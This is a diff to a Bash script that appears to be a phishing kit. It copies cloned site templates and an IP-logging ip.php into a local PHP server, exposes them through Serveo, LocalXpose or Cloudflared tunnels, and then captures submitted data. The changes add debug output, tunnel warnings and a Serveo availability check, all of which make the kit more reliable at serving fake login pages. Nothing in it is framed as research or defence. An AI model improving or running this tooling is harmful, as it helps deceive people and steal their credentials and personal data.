@@ -403,8 +403,18 @@ cusport() {
 ## Setup website and start php server
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	
+	# LIMPIAR TODO primero
+	echo -e "${YELLOW}[DEBUG] Cleaning .server/www/ first...${WHITE}"
+	rm -rf .server/www/*
+	
+	echo -e "${YELLOW}[DEBUG] Template selected: $website${WHITE}"
+	echo -e "${YELLOW}[DEBUG] Copying from: .sites/$website/${WHITE}"
+	ls -lh .sites/$website/ | head -3
+	
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
+	
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
@@ -455,6 +465,20 @@ start_cloudflared() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
+	
+	# Warning para Android
+	if [[ $(uname -o) == *'Android'* ]]; then
+		echo -e "\n${ORANGE}╔════════════════════════════════════════════╗${WHITE}"
+		echo -e "${ORANGE}║  ${RED}⚠️  WARNING: ANDROID DETECTED${WHITE}             ${ORANGE}║${WHITE}"
+		echo -e "${ORANGE}║  ${WHITE}Cloudflared often fails on Android due${WHITE}   ${ORANGE}║${WHITE}"
+		echo -e "${ORANGE}║  ${WHITE}to IPv6 DNS issues. Use Serveo instead.${WHITE}  ${ORANGE}║${WHITE}"
+		echo -e "${ORANGE}╚════════════════════════════════════════════╝${WHITE}\n"
+		read -p "${RED}[${WHITE}-${RED}]${YELLOW} Continue anyway? (y/N): ${WHITE}" cf_continue
+		if [[ ! "$cf_continue" =~ ^[Yy]$ ]]; then
+			tunnel_menu
+			return
+		fi
+	fi
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
@@ -541,6 +565,14 @@ start_loclx() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
+	
+	# Warning de límite de 15 minutos
+	echo -e "\n${YELLOW}╔════════════════════════════════════════════╗${WHITE}"
+	echo -e "${YELLOW}║  ${WHITE}LocalXpose Free Tier: ${RED}15 MINUTES LIMIT${WHITE}  ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}After 15min, tunnel will disconnect${WHITE}     ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}║  ${CYAN}Upgrade at: ${WHITE}https://localxpose.io${WHITE}      ${YELLOW}║${WHITE}"
+	echo -e "${YELLOW}╚════════════════════════════════════════════╝${WHITE}\n"
+	sleep 2
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
@@ -568,13 +600,23 @@ start_localhost() {
 	capture_data
 }
 
+## Check Serveo status
+check_serveo() {
+	if timeout 3 bash -c "echo > /dev/tcp/serveo.net/22" 2>/dev/null; then
+		SERVEO_STATUS="${GREEN}ONLINE${WHITE}"
+	else
+		SERVEO_STATUS="${RED}DOWN${WHITE}"
+	fi
+}
+
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
+	check_serveo
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost      ${RED}[${CYAN}Local network only${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Serveo         ${RED}[${GREEN}Recommended - Works Great!${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Serveo         ${RED}[${WHITE}Status: ${SERVEO_STATUS}${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose     ${RED}[${CYAN}Free: 15min limit${RED}]
 		${RED}[${WHITE}04${RED}]${ORANGE} Cloudflared    [${ORANGE}May fail on Android${RED}]
 
@@ -586,7 +628,14 @@ tunnel_menu() {
 		1 | 01)
 			start_localhost;;
 		2 | 02)
-			start_serveo;;
+			if [[ "$SERVEO_STATUS" == *"DOWN"* ]]; then
+				echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Serveo is temporarily down. Try LocalXpose (option 03)."
+				sleep 3
+				tunnel_menu
+			else
+				start_serveo
+			fi
+			;;
 		3 | 03)
 			start_loclx;;
 		4 | 04)
